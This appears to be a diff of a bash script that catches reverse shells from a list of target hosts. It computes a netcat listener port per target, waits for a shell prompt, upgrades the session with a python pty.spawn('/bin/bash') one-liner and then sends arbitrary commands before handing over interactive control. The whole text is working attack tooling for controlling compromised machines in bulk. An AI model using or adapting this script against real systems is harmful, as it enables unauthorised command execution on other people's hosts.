@@ -22,16 +22,14 @@ for TARGET in "${TARGETS[@]}"; do
     PORT=$(($BASE_PORT + $SECOND*100 + $FOURTH))
     echo "[$TARGET] Connecting over port $PORT"
 
-
-    expect_script="
-    spawn nc -lvnp 1110
-    expect -re \"\[#\$\] \"
-    set timeout -1
+    expect << EOF
+    spawn nc -lvnp $PORT
+    expect -re "\[#\$\] "
+    send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
     $(for cmd in "$@"; do
         echo "expect -re \"\[#\$\] \""
         echo "send \"$cmd\r\""
     done)
     interact
-    "
-echo "$expect_script"
+    EOF
 done
